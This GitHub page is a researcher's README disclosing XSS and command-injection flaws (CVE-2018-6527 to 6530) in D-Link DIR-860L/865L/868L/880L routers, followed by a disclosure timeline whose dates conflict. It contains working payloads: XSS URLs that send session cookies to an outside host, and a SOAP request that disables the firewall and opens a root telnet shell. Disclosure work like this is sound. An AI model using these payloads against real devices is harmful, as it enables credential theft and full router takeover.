=== Content from github.com_cee53f7b_20250125_211919.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=soh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[soh0ro0t](/soh0ro0t)
/
**[Pwn-Multiple-Dlink-Router-Via-Soap-Proto](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto)**
Public

* [Notifications](/login?return_to=%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto) You must be signed in to change notification settings
* [Fork
  2](/login?return_to=%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto)
* [Star
   11](/login?return_to=%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto)

日前我发现了D-Link DIR 880L/865L/868L/860L路由器存在多个XSS和命令注入漏洞，最主要的问题是路由器未对用户输入进行检查，导致恶意数据请求被执行，最终被远程攻击者控制整个设备。

[11
stars](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/stargazers) [2
forks](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/forks) [Branches](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/branches) [Tags](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/tags) [Activity](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/activity)
 [Star](/login?return_to=%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto)

 [Notifications](/login?return_to=%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto) You must be signed in to change notification settings

* [Code](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto)
* [Issues
  0](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/issues)
* [Pull requests
  0](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/pulls)
* [Actions](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/actions)
* [Projects
  0](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/projects)
* [Security](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/security)
* [Insights](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/pulse)

Additional navigation options

* [Code](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto)
* [Issues](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/issues)
* [Pull requests](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/pulls)
* [Actions](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/actions)
* [Projects](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/projects)
* [Security](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/security)
* [Insights](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/pulse)

# soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto

    master[Branches](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/branches)[Tags](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[13 Commits](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/commits/master/) | | |
| [README.md](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/blob/master/README.md "README.md") | | [README.md](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/blob/master/README.md "README.md") |  |  |
| View all files | | |

## Repository files navigation

* README
## 0x00 Product Description

Dlink is a multinational networking equipment manufacturing corporation.

The Dlink 860L/865L/868L/880L are wireless "Cloud" Router.

The vulnerabilities details are as follows:

Vendor: D-Link

Devices: DIR-880 REVA / DIR-868 REVA / DIR-865 / DIR-860 REVA

Firmware:

DIR-880L\_REVA\_FIRMWARE\_PATCH\_1.08B04

DIR868LA1\_FW112b04

DIR-865L\_REVA\_FIRMWARE\_PATCH\_1.08.B01

DIR860LA1\_FW110b04

## 0x01 Vulnerabilities Summary

The Dlink 860L/865L/868L/880L is a router overall badly designed with a lot of vulnerabilities.

My research in analyzing the security of Dlink routers starts from a recent security contest organized by a security company.

## 0x02 The summary of the vulnerabilities is:

1. WAN && LAN - revA/B - XSS - CVE-2018-6527, CVE-2018-6528, CVE-2018-6529
2. LAN - revA/B - OS command injection - CVE-2018-6530

## 0x03 Details - WAN && LAN - revA/B - XSS

After analyzing PHP files inside /htdocs/webinc, I found several trivial XSS vulnerabilities.

An attacker can use the XSS to target an authenticated user in order to steal the authentication cookies.

1. xss inside /htdocs/webinc/body/bsc\_sms\_send.php

```
[…]
                <span class="value">
                        <input id="receiver" type="text" size="50" maxlength="15" value="<? echo $_GET["receiver"]; ?>"/>
                </span>
[…]
```

An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
[http://192.168.0.1/bsc\_sms\_send.php?receiver=">](http://192.168.0.1/bsc_sms_send.php?receiver=%22%3E)<script>window.open('<http://9.9.9.9:9999/cookie.asp?msg='+document.cookie>)</script><"

2. xss inside /htdocs/ webinc/js/adv\_parent\_ctrl\_map.php

```
[…]
                var msgArray =
                [
                        '<?echo i18n("You have successfully configured your router to use OpenDNS Parental Control.");?>',
                        '<?echo i18n("Do you want to test the function?");?>',
                        '<p><input type="button" value="<?echo i18n('Test');?>" onclick="window.open(\'http://www.opendns.com/device/welcome/?device_id=<? echo $_GET["deviceid"];?>\')" /><input type="button" value="<?echo i18n('Return');?>" onClick="self.location.href=\'adv_parent_ctrl.php\';" /></p>'
                ];
                BODY.ShowMessage('<?echo i18n("OpenDNS PARENTAL CONTROLS");?>', msgArray);
[…]
```

An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
[http://192.168.0.1/adv\_parent\_ctrl\_map.php?deviceid=whatever\');window.open(\'http://9.9.9.9:9999/cookie.asp?msg=\'+document.cookie](http://192.168.0.1/adv_parent_ctrl_map.php?deviceid=whatever%5C');window.open(%5C'http://9.9.9.9:9999/cookie.asp?msg=%5C'+document.cookie)

3. xss inside /htdocs/ webinc/js/bsc\_sms\_inbox.php

```
[…]
        InitValue: function(xml)
        {
                var get_Treturn = '<?if($_GET["Treturn"]=="") echo "0"; else echo $_GET["Treturn"];?>';
         …
        }
[…]
```

An attacker could lure the victim to inadvertently open this vulnerable page as an authenticated user:
<http://192.168.0.1/bsc_sms_inbox.php?Treturn=0';window.open('http://9.9.9.9:9999/cookie.asp?msg='+document.cookie);get_Treturn='1>

## 0x04 Details - LAN - revA/B - Command injection in SOAP controlType url interface

The vulnerability occurs in /htdocs/cgibin which is executed by the web server for, just handles almost http requests from WAN and LAN, and my research in analyzing SOAP interface started from a security analysis report regarding UPNP protocol, then I reviewed the SOAP interface, which is handled by the soapcgi\_main function in cgibin, seems to have been mostly overlooked.

It should be noted that you could insert and execute malicious commands without privilege, meanwhile the injection point is the service field which is passed to soap.cgi to indicate control type, this exploitation also works even if invalid SOAPAction and whatever XML stream in a request.

Here’s the code in C to show some details about this issue:

```
/* Grab a pointer to the request url */
requri = getenv("REQUEST_URI");
/* goto failure if the urquri does not start with "?service=" */
if((query = strchr(requri, "?")) == NULL or strncmp(query, "?service=", strlen("?service=")))
{
    goto failure_condition;
}
/* Point the control type field pointer 9 bytes beyond the requri */
controlType = query + strlen("?service=");

... ...

/* Create/open a shell script using the specified control type string */
sprintf(filename, "%s/%s_%d.sh", "/var/run", controlType, getpid());
fn = fopen(filename "a+");
/* Write self-deleting command into the srcipt and execute it by "sh -c"*/
if(fn)
{
    fprintf(fn, "rm -f %s/%s_%d.sh", "/var/run", controlType, getpid());
    fclose(fn);
    sprintf(filename, "%s/%s_%d.sh", "/var/run", controlType, getpid());
    system(filename);
}
```

Proof of concept:

```
POST /soap.cgi?service=whatever-control;iptables -P INPUT ACCEPT;iptables -P FORWARD ACCEPT;iptables -P OUTPUT ACCEPT;iptables -t nat -P PREROUTING ACCEPT;iptables -t nat -P OUTPUT ACCEPT;iptables -t nat -P POSTROUTING ACCEPT;telnetd -p 9999;whatever-invalid-shell HTTP/1.1
Host: 192.168.100.1:49152
Accept-Encoding: identity
Content-Length: 16
SOAPAction: "whatever-serviceType#whatever-action"
Content-Type: text/xml

whatever-content

Here, we can easily build a soap http request and embed malicious command that spawns a telnet server on WAN that provides an unauthenticated root shell into it, and then login into router using telnet:
$ telnet 192.168.0.1 9999
Trying 192.168.0.1...
Connected to 192.168.0.1.
Escape character is '^]'.

```

## 0x05 Report Timeline

Dec 8, 2017: Vulnerabilities found.

Jul 18, 2018: Reported to security@dlink.com.

Jul 18, 2018: The vendor followed up and made a schedule to fix it.

Feb 1, 2018: Reported those security issues to MITRE.

Feb 1, 2018: MITRE provides CVE-2018-6527, CVE-2018-6528, CVE-2018-6529, CVE-2018-6530.

Mar 1, 2018: The vendor release security announcement for customers.

Mar 2, 2018: I decide to make a public disclosure.

## 0x06 Credits

These vulnerabilities were found by Kaixiang Zhang.

## 0x07 References

### DIR-880L RevA

Release Notes - ftp://ftp2.dlink.com/SECURITY\_ADVISEMENTS/DIR-880L/REVA/DIR-880L\_REVA\_FIRMWARE\_PATCH\_NOTES\_1.08B06\_EN\_WW.pdf

Firmware - ftp://FTP2.DLINK.COM/SECURITY\_ADVISEMENTS/DIR-880L/REVA/DIR-880L\_REVA\_FIRMWARE\_PATCH\_v1.08B06\_BETA.zip

### DIR-865L RevA

Release Notes - ftp://ftp2.dlink.com/SECURITY\_ADVISEMENTS/DIR-865L/REVA/DIR-865L\_REVA\_FIRMWARE\_PATCH\_NOTES\_1.10B01\_EN\_WW.pdf

Firmware - ftp://FTP2.DLINK.COM/SECURITY\_ADVISEMENTS/DIR-865L/REVA/DIR-865L\_REVA\_FIRMWARE\_PATCH\_v1.10B01\_BETA.zip

### DIR-868L RevA

Release Notes - ftp://ftp2.dlink.com/SECURITY\_ADVISEMENTS/DIR-868L/REVA/DIR-868L\_REVA\_FIRMWARE\_PATCH\_NOTES\_1.20B01\_EN\_WW.pdf

Firmware - ftp://FTP2.DLINK.COM/SECURITY\_ADVISEMENTS/DIR-868L/REVA/DIR-868L\_REVA\_FIRMWARE\_PATCH\_v1.20B01\_BETA.zip

### DIR-860L RevA

Release Notes - ftp://ftp2.dlink.com/SECURITY\_ADVISEMENTS/DIR-860L/REVA/DIR-860L\_REVA\_FIRMWARE\_PATCH\_NOTES\_1.11B01\_EN\_WW.pdf

Firmware - ftp://FTP2.DLINK.COM/SECURITY\_ADVISEMENTS/DIR-860L/REVA/DIR-860L\_REVA\_FIRMWARE\_PATCH\_v1.11B01\_BETA.zip

## About

日前我发现了D-Link DIR 880L/865L/868L/860L路由器存在多个XSS和命令注入漏洞，最主要的问题是路由器未对用户输入进行检查，导致恶意数据请求被执行，最终被远程攻击者控制整个设备。

### Resources

[Readme](#readme-ov-file)

[Activity](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/activity)
### Stars

[**11**
stars](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/stargazers)
### Watchers

[**2**
watching](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/watchers)
### Forks

[**2**
forks](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fsoh0ro0t%2FPwn-Multiple-Dlink-Router-Via-Soap-Proto&report=soh0ro0t+%28user%29)

## [Releases](/soh0ro0t/Pwn-Multiple-Dlink-Router-Via-Soap-Proto/releases)

No releases published

## [Packages 0](/users/soh0ro0t/packages?repo_name=Pwn-Multiple-Dlink-Router-Via-Soap-Proto)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


